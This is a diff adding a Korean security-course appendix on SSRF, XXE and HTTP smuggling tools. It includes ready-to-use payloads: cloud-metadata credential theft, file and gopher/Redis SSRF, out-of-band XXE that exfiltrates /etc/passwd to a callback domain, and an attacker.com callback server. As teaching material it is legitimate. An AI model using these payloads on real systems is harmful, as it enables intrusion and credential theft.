@@ -901,3 +901,315 @@ graph LR
 
 **학생 액션**: BloodHound + impacket.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 — Week 04 웹 고급 (SSRF/XXE))
+
+### lab step → 도구 매핑
+
+| step | 학습 항목 | OSS 도구 |
+|------|----------|---------|
+| s1 | SSRF 자동 점검 | SSRFmap |
+| s2 | XXE injection | xxe-injection-payload-list |
+| s3 | XXE OOB (out-of-band) | XXEinjector |
+| s4 | OOB DNS interaction | Burp Collaborator OSS / interactsh |
+| s5 | wapiti (자동 종합) | wapiti |
+| s6 | nuclei advanced templates | nuclei |
+| s7 | HTTP smuggling | smuggler / http2smugl |
+| s8 | API security | nuclei API + custom | 
+
+### 학생 환경 준비
+
+```bash
+# === SSRFmap ===
+git clone https://github.com/swisskyrepo/SSRFmap ~/ssrfmap
+cd ~/ssrfmap && pip install -r requirements.txt
+
+# === XXE 도구 ===
+git clone https://github.com/enjoiz/XXEinjector ~/xxeinjector
+
+# XXE payload list
+git clone https://github.com/payloadbox/xxe-injection-payload-list ~/xxe-payloads
+
+# === interactsh (OOB callback) ===
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+# 또는 self-host:
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
+
+# === wapiti ===
+sudo apt install -y wapiti
+
+# === nuclei + advanced templates ===
+nuclei -update-templates
+git clone https://github.com/projectdiscovery/nuclei-templates ~/nuclei-templates
+
+# === smuggler (HTTP smuggling) ===
+git clone https://github.com/defparam/smuggler ~/smuggler
+
+# === http2smugl (HTTP/2 smuggling) ===
+go install github.com/neex/http2smugl@latest
+
+# === Burp Suite Community (수동 검증) ===
+# https://portswigger.net/burp/communitydownload
+```
+
+### 핵심 — SSRF (Server-Side Request Forgery)
+
+```bash
+# === SSRFmap (자동) ===
+
+# 1) 단일 URL 자동 fuzz
+python3 ~/ssrfmap/ssrfmap.py \
+    -r req.txt \
+    -p url \
+    -m readfiles,portscan,smtp,redis
+
+# req.txt 예 (Burp request export):
+# POST /api/fetch HTTP/1.1
+# Host: target.com
+# Content-Type: application/json
+# 
+# {"url":"http://example.com"}                           ← 'url' 파라미터에 inject
+
+# 2) 모듈별 시도
+# - readfiles: file:// 으로 파일 읽기
+# - portscan: 내부 port 스캔
+# - smtp: SMTP 으로 internal 메일 서버 abuse
+# - redis: Redis 명령 주입
+# - networks: 내부 네트워크 enum
+
+# === 수동 SSRF payload ===
+
+# Cloud metadata (AWS / GCP / Azure)
+curl "http://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+
+# Internal network
+curl "http://target.com/api/fetch?url=http://internal-db:5432/"
+curl "http://target.com/api/fetch?url=http://10.0.0.1:22"
+
+# File scheme
+curl "http://target.com/api/fetch?url=file:///etc/passwd"
+
+# Redis
+curl "http://target.com/api/fetch?url=gopher://internal-redis:6379/_*1%0d%0a%243%0d%0aSET%0d%0a%245%0d%0apwn%0d%0a"
+
+# === Bypass — DNS rebinding ===
+# 1.2.3.4.nip.io → DNS resolves 1.2.3.4 (bypass URL filter)
+curl "http://target.com/api/fetch?url=http://127.0.0.1.nip.io/"
+```
+
+### XXE (XML External Entity)
+
+```bash
+# === Classic XXE — file read ===
+cat > /tmp/xxe.xml << 'XMLEOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+XMLEOF
+
+curl -X POST http://target.com/api/upload \
+    -H "Content-Type: application/xml" \
+    -d @/tmp/xxe.xml
+
+# === Out-of-band (OOB) XXE — 데이터 exfil ===
+
+# 1) interactsh 으로 OOB endpoint 받기
+interactsh-client > /tmp/oob.txt &
+INTERACTSH_DOMAIN=$(grep -oE '[a-z0-9]+\.oast\.fun' /tmp/oob.txt | head -1)
+
+# 2) Payload (DNS lookup 기반 exfil)
+cat > /tmp/xxe-oob.xml << XMLEOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://$INTERACTSH_DOMAIN/?data=%file;'>">
+  %eval;
+  %exfil;
+]>
+<root></root>
+XMLEOF
+
+# 3) Submit
+curl -X POST http://target.com/api/parse \
+    -H "Content-Type: application/xml" \
+    -d @/tmp/xxe-oob.xml
+
+# 4) interactsh 가 callback 받음 → /etc/passwd 내용 노출
+
+# === XXEinjector (자동) ===
+ruby ~/xxeinjector/XXEinjector.rb \
+    --host=target.com \
+    --httpport=80 \
+    --file=req.txt \
+    --path=/api/parse \
+    --oob=http
+```
+
+### interactsh (OOB callback 표준)
+
+```bash
+# === Client 사용 ===
+interactsh-client
+# 출력:
+# https://...........oast.fun
+# 이 domain 으로 들어오는 모든 callback 자동 표시
+
+# === Self-host server (실전 환경) ===
+interactsh-server -domain attacker.com -ldf cert.pem
+# 자체 도메인의 OOB callback receive
+
+# === Nuclei 와 통합 ===
+nuclei -u http://target -t custom-xxe.yaml -interactsh-server https://attacker-oob
+```
+
+### wapiti (다목적 자동 web scanner)
+
+```bash
+# === 모든 vuln 자동 ===
+wapiti -u http://target.com \
+    --scope folder \
+    -m all \
+    -o /tmp/wapiti-report
+
+# 검출 모듈:
+# - sql (SQLi)
+# - xss
+# - exec (RCE)
+# - file (LFI/RFI)
+# - xxe
+# - ssrf
+# - htaccess
+# - csrf
+# - permanentxss
+
+# === 특정 모듈만 ===
+wapiti -u http://target -m sql,xss,xxe,ssrf
+
+# === 인증된 scan ===
+wapiti -u http://target \
+    -a user%password
+    -auth-method post                                     # form-based
+```
+
+### nuclei advanced (custom + community templates)
+
+```bash
+# === 1. Severity 별 ===
+nuclei -u http://target -severity critical,high
+
+# === 2. Tags 별 ===
+nuclei -u http://target -tags ssrf,xxe,injection
+
+# === 3. CVE 별 ===
+nuclei -u http://target -tags cve
+
+# === 4. 커스텀 template (XXE OOB) ===
+cat > /tmp/xxe-custom.yaml << 'TEOF'
+id: xxe-oob-detection
+info:
+  name: XXE OOB Detection
+  severity: critical
+
+http:
+  - method: POST
+    path: ['{{BaseURL}}/api/parse']
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY xxe SYSTEM "http://{{interactsh-url}}/{{randstr}}">
+      ]>
+      <root>&xxe;</root>
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words: ["http", "dns"]
+      - type: status
+        status: [200, 500]
+TEOF
+
+nuclei -u http://target -t /tmp/xxe-custom.yaml \
+    -interactsh-server https://oast.fun
+```
+
+### HTTP smuggling (smuggler / http2smugl)
+
+```bash
+# === smuggler (HTTP/1.1 CL.TE / TE.CL) ===
+python3 ~/smuggler/smuggler.py -u target.com -m TE.CL
+python3 ~/smuggler/smuggler.py -u target.com -m CL.TE
+
+# 출력 예 (취약):
+# [TE.CL] target.com → vulnerable
+# Test results: ...
+
+# === http2smugl (HTTP/2 → HTTP/1.1 smuggling) ===
+http2smugl detect https://target.com
+http2smugl smuggle https://target.com \
+    --request 'GET /admin HTTP/1.1\r\n...'
+```
+
+### 통합 web vuln scan 흐름
+
+```bash
+#!/bin/bash
+# /opt/scripts/web-advanced-scan.sh
+TARGET=$1
+DIR=/var/log/web-scan/$TARGET-$(date +%Y%m%d-%H%M)
+mkdir -p $DIR
+
+# === 1. nikto (전통적 ===
+nikto -h $TARGET -o $DIR/01-nikto.txt
+
+# === 2. nuclei 종합 ===
+nuclei -u $TARGET -severity high,critical \
+    -o $DIR/02-nuclei.json -j
+
+# === 3. wapiti ===
+wapiti -u $TARGET -o $DIR/03-wapiti
+
+# === 4. SSRFmap ===
+# (req.txt 필요 — Burp 으로 export)
+# python3 ~/ssrfmap/ssrfmap.py -r req.txt -p url -m all > $DIR/04-ssrfmap.txt
+
+# === 5. XXE 자동 (XXEinjector) ===
+ruby ~/xxeinjector/XXEinjector.rb --host=$TARGET ... > $DIR/05-xxe.txt
+
+# === 6. HTTP smuggling ===
+python3 ~/smuggler/smuggler.py -u $TARGET > $DIR/06-smuggler.txt
+
+# === 7. Sqlmap (week03 재사용) ===
+sqlmap -u "http://$TARGET/?id=1" --batch --random-agent > $DIR/07-sqlmap.txt
+
+# === 8. interactsh (OOB callbacks 모니터) ===
+interactsh-client > $DIR/08-oob-callbacks.txt &
+sleep 3600                                                # 1시간 대기
+
+# === 9. 통합 보고서 ===
+cat > $DIR/00-report.md << EOF
+# Web Vulnerability Report — $TARGET
+
+## Critical/High findings
+- nuclei: $(jq '[.[] | select(.severity == "critical" or .severity == "high")] | length' $DIR/02-nuclei.json)
+- nikto: $(grep -c "+ " $DIR/01-nikto.txt)
+- wapiti: (HTML report 참조)
+
+## SSRF / XXE
+$(cat $DIR/04-ssrfmap.txt 2>/dev/null | head -20)
+
+## HTTP Smuggling
+$(cat $DIR/06-smuggler.txt 2>/dev/null | head)
+
+## OOB Callbacks
+$(cat $DIR/08-oob-callbacks.txt | head)
+EOF
+```
+
+학생은 본 4주차에서 **SSRFmap + XXEinjector + xxe-payload-list + interactsh + wapiti + nuclei + smuggler + http2smugl** 8 도구로 advanced web vulnerability (SSRF / XXE / HTTP smuggling / OOB) 자동 점검 + 보고서 자동 생성을 OSS 만으로 익힌다.
